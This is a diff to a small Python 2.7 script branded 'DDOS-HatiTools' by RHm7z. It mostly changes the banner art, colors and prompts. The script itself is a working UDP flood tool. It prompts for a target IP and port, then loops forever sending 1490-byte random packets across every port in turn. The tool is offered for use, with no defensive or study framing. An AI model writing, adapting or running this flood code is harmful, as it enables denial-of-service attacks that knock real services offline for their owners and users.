@@ -1,10 +1,17 @@
-#TooLs Created by RHm7z
-#Nuub Gue Stah
+#using python2.7
+#https://fb.me/arif.kun.456
 
 import os
 import sys
 import socket
 import random
+
+r = '\033[91m'
+g = '\033[92m'
+b = '\033[94m'
+
+z = r+'[ '+g
+x = r+' ] : '+g
 
 #SET SOCK AND RANDOM
 ##########################################################
@@ -14,24 +21,25 @@ bytes = random._urandom(1490)                           ##
 
 os.system("clear")
 print '''
-      ______   ______   _______  _______                ___   _________  __
-     (  __  \ (  __  \ (  ___  )(  ____ \  |\     /|   /   )  \__   __/ /  \\
-     | (  \  )| (  \  )| (   ) || (    \/  | )   ( |  / /) |     ) (    \/) )
-     | |   ) || |   ) || |   | || (_____   | (___) | / (_) (_    | |      | |
-     | |   | || |   | || |   | |(_____  )  |  ___  |(____   _)   | |      | |
-     | |   ) || |   ) || |   | |      ) |  | (   ) |     ) (     | |      | |
-     | (__/  )| (__/  )| (___) |/\____) |  | )   ( |     | |     | |    __) (_
-     (______/ (______/ (_______)\_______)  |/     \|     (_)     )_(    \____/
+                       _  _
+                      ( \/ )
+               .---.   \  /   .-"-.
+              /   6_6   \/   / 4 4 \    [ DDOS-HatiTools ]
+              \_  (__\       \_ v _/    [ Author - RHm7z ]
+              //   \\\        //   \\\  [ Garuda Tersakti 72 ]
+             ((     ))      ((     ))
+       =======""===""========""===""=======
+                |||            |||
+                 |              |
 
-                               0==> Author RHm7z <==0
 '''
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+ip = raw_input(z+"IP Address"+x)
+port = input(z+"   Port   "+x)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s sampe down port:%s"%(sent,ip,port)
+     print "Send %s packet to %s success "%(sent,ip)
      if port == 65534:
        port = 1
